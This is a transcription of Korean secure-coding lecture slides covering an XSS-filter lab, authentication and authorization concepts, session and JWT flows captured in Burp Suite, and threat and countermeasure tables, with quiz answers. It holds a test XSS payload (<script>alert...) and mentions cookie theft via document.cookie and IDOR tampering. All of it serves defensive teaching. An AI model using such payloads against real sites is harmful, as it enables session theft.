9. 프로젝트 명에서 마우스 우측 클릭한 후
Run As > Spring Boot App 실행
10.OK 버튼을 눌러 서비스 다시 실행

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
[STS 캡처: 프로젝트 우클릭 → Maven → **Update Project…** → 'Update Maven Project' 창 [OK] / 프로젝트 우클릭 → Run As → **Spring Boot App** → 'Select Java Application'에서 `SecureCodingLabTestApplication - kr.co.openeg.lab` 선택 → [OK]]

---

## [2-SLIDES] 4주차 3차시 p.21 · LAB3 - 소스코드에서 XSS 필터 동작 확인
LAB3 - 소스코드에서 XSS 필터 동작 확인
1. 파이어폭스에서 서비스 재 접속 및 로그인
2. 게시판에 들어가서 마찬가지로 새 글 작성 및 제목에
스크립트 구문 입력
3. 확인 버튼 눌러 글 등록 후 목록에서 제목 확인
제목에 스크립트 부분이 제외된 것이 확인됨
해당 글을 눌러 들어가도 경고창이 나타나지 않고 글 내용이 나타남.
XSS 필터가 글 등록 직전 정상적으로 동작하여
스크립트 구문을 삭제한 것이 확인됨

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
[브라우저 캡처 3장]
1. 글쓰기: 제목 `adfsafa<script>alert('XSS!!');</script>` 입력(빨간 상자)
2. 목록: 제목이 **`adfsafa`**만 남음(빨간 상자) — 스크립트 부분이 삭제됨
3. 조회: 제목 `adfsafa`, 경고창 없이 내용 `testtest` 표시

---

## [2-SLIDES] 4주차 3차시 p.22 · 시연 영상
시연 영상
- XSS 필터 만들기

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
[시연 영상 자리 — 'XSS 필터 만들기'. PDF에는 영상이 포함되지 않음]

---

## [2-SLIDES] 4주차 3차시 p.23 · 요약 정리
요약 정리
- 필터는 클라이언트의 HTTP 요청과 응답을 가로채어 특정 작업을 수행하는 서블릿 기반 컴포넌트로
웹 애플리케이션에서 보안, 로깅, 데이터변환등의 작업을 수행할 때 사용
- Spring Security 를 설치하면 로그인, 인증, 권한체크 등을 처리하는 필터가 기본적으로 적용
- 웹애플리케이션의 XSS 취약점을 방어하기 위해 XSS Filter를 생성해서 프레임워크에 적용

---

## [2-SLIDES] 4주차 3차시 p.24 · 참고 문헌
참고 문헌
- [KISA] 소프트웨어 개발 보안 가이드(2021.12.29)
- [KISA] 소프트웨어 보안약점 진단가이드(2021)
- [오픈이지북스] 실무에 바로 적용하는 해킹 방어를 위한 JAVA 시큐어코딩
- [secu BOOK] 웹 해킹과 시큐어코딩 탐지/수정 실습가이드
- [에이콘출판사] 보안 위협 모델링 Threat Modeling - 위협 식별과 대응을 위한 소프트웨어 설계
- [위키북스] 웹 애플리케이션 보안 완벽 가이드 - 체계적으로 배우는 안전한 웹 애플리케이션 제작 기법

---

## [2-SLIDES] 4주차 3차시 p.25 · 감사합니다.
감사합니다.

---

## [2-SLIDES] 4주차 3차시 p.26 · 퀴즈
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)
퀴즈

1. 클라이언트의 HTTP 요청과 응답을 가로채어 특정 작업을 수행하는 서블릿 기반 컴포넌트는 무엇인가?
   1) Dispatcher　2) Handler　3) Filter　4) ViewResolver
2. String 클래스에서 정규식으로 지정한 문자열을 다른 문자열로 바꾸기 위해 사용하는 메서드 이름은? (영문 10글자, . 제외)　(　　)
3. 다음 중 XSS 입력값 필터에서 처리해야 하는 내용이 아닌 것은?
   1) <script> 태그와 그 사이 내용을 제거　2) javascript: 문자열 제거
   3) onclick, onerror 등의 이벤트 핸들러 제거　4) 압축파일 안에 들어있는 스크립트 파일 제거

---

## [2-SLIDES] 4주차 3차시 p.27 · 퀴즈 정답
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)
퀴즈 정답

1. **3) Filter** — ※ 원본 정답 쪽에는 "2) Filter"로 인쇄되어 있지만, 문제의 보기에서 Filter는 **3번**입니다(2번은 Handler).
2. **( replaceAll )**
3. **4) 압축파일 안에 들어있는 스크립트 파일 제거** — 압축파일을 다루는 작업은 필터에서 처리하기에 매우 많은 리소스를 사용하며, XSS 공격 방어와도 관련이 없습니다.

# [2-SLIDES] 5주차 1차시 — 인증과 인가 · OAuth2 · JWT
키워드: 보안약점/Weakness/CWE/취약점/Vulnerability · XSS/Cross-Site Scripting/크로스사이트 스크립팅/크로스 사이트 스크립팅/크로스사이트스크립팅/CWE-79 · CSRF/Cross-Site Request Forgery/크로스사이트 요청 위조/크로스 사이트 요청 위조/XSRF/CWE-352 · SameSite/세임사이트/Strict/Lax/None · HTML Encoding/HTML 인코딩/이스케이프/Escape/엔티티/Entity/escapeHtml/textContent · Authentication/인증/로그인 · Authorization/인가/권한/RBAC/ABAC/PBAC/최소 권한 · Session/세션/JSESSIONID/세션 쿠키/쿠키/HttpOnly/Secure · Token/토큰/Bearer/베어러 · JWT/JSON Web Token/제이더블유티/Claims/클레임/HS256/RS256/Refresh Token/리프레시 토큰 · MFA/Multi-Factor/다중 인증/다중 매체 인증/OTP/FIDO2/WebAuthn · HSTS/HTTP Strict-Transport-Security/스트릭트 트랜스포트 · IDOR/Insecure Direct Object References/직접 객체 참조/수평 권한/수직 권한/권한 상승 · Filter/필터/Interceptor/인터셉터/Servlet/DispatcherServlet · Threat Modeling/위협 모델링/STRIDE/스트라이드/DREAD/드레드/MS-SDL/MTMT · SSR/CSR/Server-Side Rendering/Client-Side Rendering/서버 사이드 렌더링/클라이언트 사이드 렌더링 · localStorage/sessionStorage/로컬 저장소/로컬 스토리지/Same-Origin · ZAP/OWASP ZAP/Active Scan/Burp/버프스위트/버프 스위트

## [2-SLIDES] 5주차 1차시 p.1 · 인증과 인가 기초
인증과 인가 기초
01 인증과 인가 개요
02 인증 및 인가의 동작 과정
03 보안 위협 및 해결 방법

---

## [2-SLIDES] 5주차 1차시 p.2 · 학습 목표
학습 목표
인증과 인가의 개념을 이해하고 차이점을 설명할 수 있다.
현대 애플리케이션 보안과제를 해결하기 위한 방안을 이해한다.
사고 사례를 통한 시큐어코딩을 이해한다.

---

## [2-SLIDES] 5주차 1차시 p.3 · 학습 내용
학습 내용
1. 인증과 인가 개요
2. 인증 및 인가의 동작 과정
3. 보안위협 및 해결 방법

---

## [2-SLIDES] 5주차 1차시 p.4 · 인증과 인가 기초
인증과 인가 기초
01 인증과 인가 개요
02 인증 및 인가의 동작 과정
03 보안 위협 및 해결방법

---

## [2-SLIDES] 5주차 1차시 p.5 · 인증과 인가의 차이
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)

| 인증(Authentication) | 인가(Authorization) |
|---|---|
| (그림: openmaru 로고(판독 확신 낮음)가 있는 사원증 'JOHN DOE / ID CARD' — 신원 확인을 상징) | (그림: 태블릿 화면의 항목 목록 — 첫 항목은 녹색 체크(허용), 나머지 두 항목은 빨간 X(거부) — 권한 허용/제한을 상징) |
| 인증은 시스템 접근 시, 등록된 사용자인지 여부를 확인하는 것. / ex) 로그인 | 인증 후 사용자에게 리소스에 접근 가능한 권한을 부여하는 것과 제한하는 것 / ex) 사용자 등급(일반사용자/관리자/개인정보취급자) |

그림출처: openmaru.com

---

## [2-SLIDES] 5주차 1차시 p.6 · 인증 방식 이해
인증 방식 이해
인증은 내가 “나”임을 증명하는 것으로, 인증방법에 따라 지식기반, 소유기반, 생체기반의 방식으로 구분할 수 있다.
가장 널리 사용되는 인증방식이 아이디(ID)와 패스워드(password)를 사용하는 방식이다.
지식기반 인증(ID/PWD) 소유기반 인증 생체기반 인증
그림출처: openmaru.com

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
**[이미지 보충 — 세 가지 인증 방식 예시 그림]**

- ▶ 지식기반 인증(ID/PWD): 두 화면 캡처가 겹쳐 있음
  - Chrome 창 '로그인 < T world - Chrome', 주소창 `https://auth.skt-id.co.kr/auth/authorize.do?client_id=2590d318-0816-...` — 'T world' 로고, 'T아이디 로그인' 제목, '아이디'(입력칸 placeholder 'T아이디(이메일…'), '비밀번호'(입력칸 placeholder '비밀번호') 입력칸, '하나의 아이…'(가려짐)
  - 그 위에 겹친 '아이핀(i-PIN, 인터넷주민번호대체수단)' 창 — '메인 화면', '아이핀ID' / '비밀번호' 입력칸과 [확 인] 버튼, 아이콘 메뉴 '신규발급 / ID/비밀번호찾기 / 아이핀관리 / 고객센터', 안내문 "타 웹사이트와 동일한 ID, 비밀번호를 사용하면 도용위험이 있으니 비밀번호 변경을 권장합니다." 변경방법: 아이핀관리 > 사용자정보수정 > 비밀번호변경, 하단 링크 '이용약관 | 개인정보취급방침 | 홈페이지 | 닫기' (작은 글씨, 판독 확신 낮음)
- ▶ 소유기반 인증: KB국민은행 OTP 토큰 사진(버튼 + LCD 창, 'www.kbstar.com ☎1588-9999') + 공동인증서 선택 창 캡처
  - 상단 배너 '보이스피싱 의심! (금감원 ☎1332)', 'KB국민은행'
  - '인증서 저장 위치를 선택해 주세요': 하드디스크(선택됨) / 이동식 / 보안토큰 / 휴대폰 / 안전디스크 / 간편인증(비활성)
  - '사용할 인증서를 선택해 주세요': 표 머리 '구분 | 사용자 | 만료일 | 발급자', 버튼 '인증서 보기 / 인증서 찾기 / 인증서 삭제'
  - '인증서 암호를 입력해 주세요' 입력칸, 안내 "안전한 금융거래를 위해 6개월마다 인증서 암호를 변경하시기 바랍니다.", [확인] [취소] 버튼 (작은 글씨, 판독 확신 낮음)
- ▶ 생체기반 인증: 홍채(눈) 흑백 근접 사진과 지문 이미지가 겹쳐 있음

---

## [2-SLIDES] 5주차 1차시 p.7 · 인증 방식 이해 – 지식기반 인증
인증 방식 이해 – 지식기반 인증
정의
사용자가 알고 있는 정보를 기반으로 본인 여부를 확인하는 인증 방식(예: 비밀번호, PIN, 보안 질문)
장점
구현 및 사용이 비교적 간편하고 사용자에게 익숙 (비밀번호)
단점
사회공학적 공격, 정보 유출 시 위험 증가, 예측 가능한 질문의 경우 보안 취약
보완 방안
다단계 인증(MFA)과 결합하여 보안 강화, 주기적인 질문 및 답변 업데이트 권장

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
**[이미지 보충]** 오른쪽에 지식기반 인증 예시 캡처(6쪽과 동일): Chrome 'T world' 'T아이디 로그인' 화면(`https://auth.skt-id.co.kr/auth/authorize.do?client_id=2590d318-0816-...`, 아이디·비밀번호 입력칸)과 그 위에 겹친 '아이핀' 로그인 창('아이핀ID'·'비밀번호' 입력 + [확 인], 신규발급 / ID/비밀번호찾기 / 아이핀관리 / 고객센터, "타 웹사이트와 동일한 ID, 비밀번호를 사용하면 도용위험이 있으니 비밀번호 변경을 권장합니다.").

---

## [2-SLIDES] 5주차 1차시 p.8 · 인증 방식 이해 – 소유기반 인증
인증 방식 이해 – 소유기반 인증
정의
사용자가 물리적으로 소유하고 있는 장치나 토큰을 기반으로 본인 확인을 수행하는 인증 방식
적용 사례
OTP (One-Time Password) 토큰. 스마트 카드 모바일 디바이스 인증
장점
실제 소유한 장치가 필요하므로, 정보 유출이나 사회공학 공격에 대한 방어력이 향상됨
지식기반 인증과 결합한 2차 인증 수단으로 활용되어 보안 강화
단점
소유하는 장치의 분실 또는 도난 시 인증이 무력화될 수 있음
추가 장치 소지 필요, 장치 재발급, 분실 신고 및 관리 체계 구축 필요,

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
**[이미지 보충]** 오른쪽에 소유기반 인증 예시(6쪽과 동일): KB국민은행 OTP 토큰 사진('www.kbstar.com ☎1588-9999')과 공동인증서 선택 창(인증서 저장 위치: 하드디스크 / 이동식 / 보안토큰 / 휴대폰 / 안전디스크 / 간편인증, '사용할 인증서를 선택해 주세요' 목록 — 구분·사용자·만료일·발급자, '인증서 암호를 입력해 주세요' 입력칸, [확인] [취소]).
(※ 원문 표기 그대로 — 단점 둘째 줄이 '관리 체계 구축 필요,'처럼 쉼표로 끝남)

---

## [2-SLIDES] 5주차 1차시 p.9 · 인증 방식 이해 – 생체기반 인증
인증 방식 이해 – 생체기반 인증
정의
사용자의 신체적 또는 행동적 특성을 기반으로 본인 여부를 확인하는 인증 방식
적용 사례
〮 지문 인식: 스마트폰, 노트북 등에서 흔히 사용
〮 안면/홍채 인식: 보안 시스템 및 모바일 기기 잠금 해제
〮 음성 인식: 콜센터나 음성 비서 인증
장점
복제나 도용이 어려워 보안성이 높음, 기억할 필요 없이 간단한 생체 정보만으로 인증하므로 편리
단점
생체 정보 유출 시 치명적 피해 우려, 조명, 소음, 센서 오류 등으로 인한 인식 실패가 잦음, 고성능 센서 및 기술 도입 비용 부담

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
**[이미지 보충]** 오른쪽에 생체기반 인증을 상징하는 홍채(눈) 흑백 근접 사진과 지문 이미지가 겹쳐 있음.

---

## [2-SLIDES] 5주차 1차시 p.10 · 보안강화를 위한 최신 인증 기술
보안강화를 위한 최신 인증 기술
비밀번호 없는 인증 (Passwordless Authentication)
(예) FIDO2, WebAuthn
공개키 기반으로 사용자 장치의 생체 인증, PIN 등을 활용하여 비밀번호 없이 인증 수행
리스크 기반 / 적응형 인증 (Risk-based/Adaptive Authentication)
로그인 시 사용자의 위치, 디바이스, 네트워크 환경, 접속 시간 등 다양한 컨텍스트 정보를 활용하여 리스크를 평가
분산 인증 (Decentralized Authentication)
(예) 분산 신원(DID, Decentralized Identity) 기반의 인증 솔루션
블록체인 등 분산원장 기술을 활용하여 중앙 집중식 사용자 데이터베이스 없이 인증 진행

---

## [2-SLIDES] 5주차 1차시 p.11 · 인증과 인가 기초
인증과 인가 기초
01 인증과 인가 개요
02 인증 및 인가의 동작 과정
03 보안 위협 및 해결방법

---

## [2-SLIDES] 5주차 1차시 p.12 · 일반적인 웹 애플리케이션의 인증/인가 프로세스
일반적인 웹 애플리케이션의 인증/인가 프로세스
인증 방식
〮 세션기반 방식
〮 토큰기반 방식
〮 외부 인증 방식
인가 방식
〮 역할기반 접근제어(RBAC) / 속성기반 접근제어(ABAC)
〮 요청에 포함된 토큰/세션 정보 기반으로 접근 권한을 갖고 있는지 확인
〮 최소 권한 부여 원칙
일반적인 인증 / 인가 프로세스
〮 1단계: 사용자 로그인 → 서버에서 자격 증명 확인
〮 2단계: 성공 시 세션/토큰 발급 → 이후 요청 시 포함
〮 3단계: API 게이트웨이나 미들웨어에서 토큰/세션 검증 → 권한에 따른 접근 제어

---

## [2-SLIDES] 5주차 1차시 p.13 · 세션 기반 인증
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)

사용자의 인증 정보가 서버의 세션 저장소에 저장되는 방식

**[도식: 클라이언트(노란 막대) ↔ 서버(파란 막대) 시퀀스]**

1. 클라이언트 → 서버: **서버 접속**
   - 서버 내부 처리: **세션저장소 와 SessionID 할당** → 세션저장소(빈 박스)에 `sessionID: 12345` 생성
2. 서버 → 클라이언트: **SessionID값 전달** `Set-Cookie: session-id: 12345` (빨간 글씨)
3. 클라이언트 → 서버: **인증 요청 전송 {id,passw}** `Cookie: SessionId=12345` (빨간 글씨)
   - 서버 내부 처리: **로그인 절차 수행 후 로그인 성공이면 세션저장소에 로그인 정보 저장** → 세션저장소 박스에 `id`(빨간 글씨)가 들어가고 `sessionID: 12345`와 연결
4. 서버 → 클라이언트: **로그인 요청 처리결과 응답**

(※ 원문 표기 그대로 — 쿠키 이름이 Set-Cookie에서는 `session-id`, Cookie에서는 `SessionId`로 다르고, 실제 HTTP 문법이면 `Set-Cookie: session-id=12345` 형태여야 함. 개념 설명용 표기)

---

## [2-SLIDES] 5주차 1차시 p.14 · LAB 세션 처리 확인
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)

1. BurpSuite Proxy가 Intercept Off로 동작 중인 상태에서 LAB 웹 서비스 접속 시도
2. BurpSuite Proxy 메뉴에서 HTTP History 메뉴로 들어가 최초 접속 항목을 선택
3. 하단에 HTTP Response 내용 확인

**[화면 캡처: Burp Suite Community Edition v2025.5.3 - Temporary Project]**
- 메뉴: Burp / Project / Intruder / Repeater / View / Help
- 탭: Dashboard / Target / **Proxy**(선택) / Intruder / Repeater / Collaborator / Sequencer / Decoder / Comparer / Logger / Organizer / Extensions
- Proxy 하위 탭: Intercept / **HTTP history**(선택) / WebSockets history / Match and replace / Proxy settings
- Filter settings: Hiding CSS, image and general binary content

| # | Host | Method | URL | Params | Edited | Status code | Length | MIME type | Extension | Title |
|---|---|---|---|---|---|---|---|---|---|---|
| 122 (빨간 화살표, 선택됨) | http://localhost:8000 | GET | / | | | 302 | 483 | | | |
| 123 | http://localhost:8000 | GET | /login | | | 200 | 4380 | HTML | | 시큐어코딩랩 - 홈 |

Request (Pretty):
```http
GET / HTTP/1.1
Host: localhost:8000
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:139.0) Gecko/20100101 Firefox/139.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: ko-KR,ko;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```

Response (Raw) — 빨간 박스: Set-Cookie 줄, 빨간 주석 **"신규 접속시 새롭게 발급되는 세션 ID 쿠키"**
```http
HTTP/1.1 302
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
Set-Cookie: JSESSIONID=82932901A762AA7BE3EAC0914234970B; Path=/; HttpOnly
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
Cache-Control: no-cache, no-store, max-age=0, must-revalidate
Pragma: no-cache
Expires: 0
Location: http://localhost:8000/login
Content-Length: 0
Date: Mon, 16 Jun 2025 09:32:36 GMT
Keep-Alive: timeout=60
Connection: keep-alive
```
(4행 `Vary: Access-Control-Request-Headers`와 5행 끝의 줄바꿈된 `HttpOnly`는 빨간 박스에 일부 가려짐 — 판독 확신 낮음)
(※ 검증: JSESSIONID 값은 32자리 16진수(128비트) — Python으로 확인 — 일치. Date 'Mon, 16 Jun 2025' 요일 — Python으로 확인 — 일치. 302 응답의 Location이 /login이므로 다음 요청(123번)이 /login으로 자동 이동)

---

## [2-SLIDES] 5주차 1차시 p.15 · LAB 세션 처리 확인
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)

4. HTTP History 목록에서 자동으로 이동한 로그인 페이지 요청 항목 선택
5. 하단에 HTTP Request 내용 확인
6. 새롭게 발급받은 세션 ID값이 쿠키값으로 함께 전송되는 것이 확인됨

**[화면 캡처: Burp Suite Proxy > HTTP history — 123번 행 선택(빨간 화살표)]**

| # | Host | Method | URL | Status code | Length | MIME type | Title |
|---|---|---|---|---|---|---|---|
| 122 | http://localhost:8000 | GET | / | 302 | 483 | | |
| 123 (선택됨) | http://localhost:8000 | GET | /login | 200 | 4380 | HTML | 시큐어코딩랩 - 홈 |

Request (Pretty) — 빨간 박스: Cookie 줄, 빨간 주석 **"새롭게 저장된 세션 ID 쿠키 값"**
```http
GET /login HTTP/1.1
Host: localhost:8000
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:139.0) Gecko/20100101 Firefox/139.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: ko-KR,ko;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Cookie: JSESSIONID=82932901A762AA7BE3EAC0914234970B
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```
(7행 Connection, 9행 Upgrade-Insecure-Requests는 빨간 박스에 일부 가려짐)

Response (Pretty):
```http
HTTP/1.1 200
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
Cache-Control: no-cache, no-store, max-age=0, must-revalidate
Pragma: no-cache
Expires: 0
Content-Type: text/html;charset=UTF-8
Content-Language: ko-KR
Date: Mon, 16 Jun 2025 09:32:36 GMT
Keep-Alive: timeout=60
Connection: keep-alive
Content-Length: 3944

<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml">

  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
    <title>
      □□□□□□ - □   (… 이하 잘림; 한글 제목이 깨진 글자로 표시됨)
```
(※ 검증: 14쪽 Set-Cookie로 받은 JSESSIONID와 이 요청의 Cookie 값이 32자 모두 동일 — Python으로 확인 — 일치. 이번 응답에는 Set-Cookie가 없어 기존 세션이 유지됨)

---

## [2-SLIDES] 5주차 1차시 p.16 · 토큰 기반 인증
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)

사용자의 인증 정보를 클라이언트가 들고 있는 방식

**[도식: 클라이언트(노란 막대) ↔ 서버(파란 막대) 시퀀스]**

1. 클라이언트 → 서버: **사용자 로그인** `{username, password}` (빨간 글씨)
   - 서버 내부 처리: **사용자의 JWT 생성**
2. 서버 → 클라이언트: **클라이언트에게 암호화된 토큰 전송** `{JWT}` (빨간 글씨)
   - 클라이언트 측: **JWT를 로컬 스토리지에 저장**
3. 클라이언트 → 서버: **헤더에 JWT를 담아서 인증 요청 전송** `Authorization: Bearer $(JWT_TOKEN)` (빨간 글씨)
   - 서버 내부 처리: **JWT 검증 후 담겨있는 인증정보 확인**
4. 서버 → 클라이언트: **지속적으로 요청에 대한 응답 전송**

(※ 검증: 17쪽 토큰 헤더 `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9`를 Base64URL 디코드하면 `{"alg":"HS256","typ":"JWT"}` — 일반 JWT(JWS)는 Base64URL 인코딩 + HMAC 서명일 뿐 암호화가 아니므로 누구나 내용을 읽을 수 있음. '암호화된 토큰'은 원문 표현 그대로)

---

## [2-SLIDES] 5주차 1차시 p.17 · JWT 로그인 세션 처리 확인
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)

1. 사용자 로그인 HTTP Request
```http
POST /api/auth/login HTTP/1.1
Host: example.com
Content-Type: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
Accept: application/json
Connection: keep-alive
Content-Length: 52

{
    "username": "user123",
    "password": "securePass!"
}
```

2. 사용자 로그인 HTTP Response
- 세션 토큰이 JWT 형태로 발급됨
- 만료기간 설정됨

```http
HTTP/1.1 200 OK
Content-Type: application/json
Server: nginx/1.21.3
Date: Tue, 26 Feb 2025 14:00:00 GMT
Connection: keep-alive
Content-Length: 180

{
    "access_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
    "token_type": "Bearer",
    "expires_in": 3600
}
```
(빨간 박스: access_token / token_type / expires_in 세 줄 강조)

(※ 검증: access_token 앞부분 `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9` Base64URL 디코드 → `{"alg":"HS256","typ":"JWT"}` — Python으로 확인 — 일치. expires_in 3600 = 1시간)
(※ 검증: 2025-02-26은 Python으로 확인 시 수요일(Wed) — 원문 'Tue'와 불일치, 예시용 값)
(※ 검증: 요청 본문 길이 — 들여쓰기 포함 60바이트, 공백 없는 JSON 47바이트, `{"username": "user123", "password": "securePass!"}` 50바이트로 Content-Length 52와 정확히 맞지 않음. 응답 Content-Length 180도 토큰이 '...'으로 생략되어 확인 불가 — 예시용 값)

---

## [2-SLIDES] 5주차 1차시 p.18 · JWT 로그인 세션 처리 확인
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)

3. 사용자 프로필 조회 HTTP Request
   Authorization 에 JWT 세션 토큰을 넣어 전송
```http
GET /api/user/profile HTTP/1.1
Host: example.com
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
Accept: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
Connection: keep-alive
```
(빨간 박스: Authorization 줄 강조)

3. 사용자 프로필 조회 HTTP Response (※ 원문 표기 그대로 — 번호가 Request와 같은 '3.')
```http
HTTP/1.1 200 OK
Content-Type: application/json
Server: nginx/1.21.3
Date: Tue, 26 Feb 2025 14:01:00 GMT
Connection: keep-alive
Content-Length: 120

{
    "user_id": 12345,
    "username": "user123",
    "email": "user123@example.com",
    "role": "admin"
}
```
(빨간 박스: user_id / username / email / role 네 줄 강조)

(※ 검증: Authorization 토큰 헤더는 17쪽 발급 토큰과 동일(`{"alg":"HS256","typ":"JWT"}`) — 일치. 2025-02-26은 수요일로 'Tue'와 불일치. 응답 본문 길이는 들여쓰기 포함 108바이트, 공백 없는 JSON 83바이트로 Content-Length 120과 불일치 — 예시용 값)

---

## [2-SLIDES] 5주차 1차시 p.19 · 인증과 인가 기초
인증과 인가 기초
01 인증과 인가 개요
02 인증 및 인가의 동작 과정
03 보안 위협 및 해결방법

---

## [2-SLIDES] 5주차 1차시 p.20 · 주요 인증 보안 위협
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)

| 위협 | 설명 | 예제 |
|---|---|---|
| 비밀번호 기반 공격 / (Credential Stuffing, Dictionary Attack) | 공격자가 유출된 사용자 계정을 활용하여 로그인 시도 | -자동화된 스크립트로 유출된 계정/비밀번호 조합을 입력 / - 쉬운 비밀번호(123456, password 등)를 대입 |
| 피싱(Phishing) & 소셜 엔지니어링 | 사용자에게 속여 로그인 정보를 탈취 | - 가짜 로그인 페이지를 만들어 사용자 입력을 유도 |
| 중간자 공격 / (MITM, Man-In-The-Middle Attack) | 네트워크 트래픽을 가로채 인증 정보를 탈취 | - 공용 Wi-Fi에서 패킷을 가로채 로그인 정보 수집 |
| 세션 탈취 / (Session Hijacking) | 공격자가 유효한 세션 ID를 도용하여 로그인 상태를 유지 | - 쿠키 탈취(document.cookie), 세션 ID 도용 |
| 무차별 대입 공격 / (Brute Force Attack) | 여러 비밀번호를 반복 시도하여 로그인 시도 | - 봇을 사용하여 다양한 비밀번호 조합을 입력 |
| 취약한 OTP / MFA / (Multi-Factor Authentication) 우회 | 2FA(이중 인증) 우회 공격 | - 2FA 코드 스니핑, SIM 스와핑(SIM Swapping) |

---

## [2-SLIDES] 5주차 1차시 p.21 · 주요 인증 보안 위협 대응 방안
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)

| 대응방법 | 설명 |
|---|---|
| 강력한 비밀번호 정책 | - 최소 8~12자 이상, 대문자/소문자/숫자/특수문자 조합 사용 / - 비밀번호 재사용 방지 (이전 비밀번호 사용 불가) |
| 계정 잠금 (Account Lockout) | - 일정 횟수 이상 로그인 실패 시 계정 잠금 |
| 다중 매체 인증 (MFA, Multi-Factor Authentication) | - OTP, 인증 앱(Google Authenticator), FIDO2 등 추가 인증 적용 |
| HTTPS 사용 및 / HSTS (HTTP strict-transport-security) 적용 | - 네트워크 암호화(SSL/TLS) 적용 |
| 세션 보안 강화 | - Secure, HttpOnly, SameSite 쿠키 적용 / - 세션 타임아웃 설정 |
| 로그인 알림 및 로그 모니터링 | - 로그인 시 이메일/SMS 알림 / - 비정상적인 로그인 감지 |
| CAPTCHA 적용 | - 봇(Bot) 기반 로그인 시도를 방지 |

---

## [2-SLIDES] 5주차 1차시 p.22 · 주요 인가 보안 위협
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)

| 위협 | 설명 | 예제 |
|---|---|---|
| 권한 상승 공격 / (Privilege Escalation) | 낮은 권한의 사용자가 관리자 권한을 얻음 | - 일반 사용자가 관리자 계정으로 변경 |
| 수평적 권한 상승 / (Horizontal Privilege Escalation) | 동일 권한 내에서 다른 사용자의 데이터에 접근 | - user_id=123을 user_id=124로 변경하여 다른 사용자 정보 접근 |
| 수직적 권한 상승 / (Vertical Privilege Escalation) | 일반 사용자가 관리 권한을 얻음 | - 웹 요청을 수정하여 admin=true 설정 |
| 취약한 객체 직접 참조 / (IDOR, Insecure Direct Object References) | 다른 사용자의 데이터에 직접 접근 | - /user/1001/profile → /user/1002/profile 변경하여 다른 사용자의 정보 조회 |
| CSRF (Cross-Site Request Forgery) | 사용자의 세션을 이용하여 공격자가 악의적인 요청 수행 | - 사용자가 로그인된 상태에서 공격자가 강제 요청 실행 |
| 불충분한 API 권한 검증 | API 요청에서 적절한 권한 검사가 없음 | - GET /admin/users API가 일반 사용자에게도 노출됨 |
| URL 기반 접근 통제 부족 | URL만 알면 누구나 접근 가능 | - /admin/dashboard에 접근할 수 있는 사용자 제한이 없음 |

---

## [2-SLIDES] 5주차 1차시 p.23 · 주요 인가 보안 위협 대응 방안
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)

| 위협 | 설명 |
|---|---|
| 최소 권한 원칙(Principle of Least Privilege) | - 모든 사용자는 필요한 최소한의 권한만 부여 |
| 역할 기반 접근 제어 (RBAC, Role-Based Access Control) | - 관리자, 일반 사용자, 게스트 등의 역할을 구분 |
| IDOR 제한 (Access Control on Object References) | - API 호출 시 세션 사용자와 요청된 리소스의 사용자 검증 |
| 정책 기반 접근 제어 (PBAC, Policy-Based Access Control) | - 특정 조건(시간대, IP 주소)에 따라 접근 제어 |
| 서버 측 권한 검사 (Server-Side Authorization Checks) | - 클라이언트에서 권한 체크를 하지 않고, 서버에서 권한 검증 수행 |
| CSRF 방지 (CSRF Token 사용) | - SameSite=strict, CSRF 토큰 검증 적용 |
| 보안 로깅 및 모니터링 | - 관리자 권한 변경, 권한 상승 시도 등을 로깅 및 감시 |

(※ 원문 표기 그대로 — 대응 방안 표인데 첫 열 머리글이 '대응방법'이 아니라 '위협'으로 되어 있음)

---

## [2-SLIDES] 5주차 1차시 p.24 · 요약 정리
요약 정리
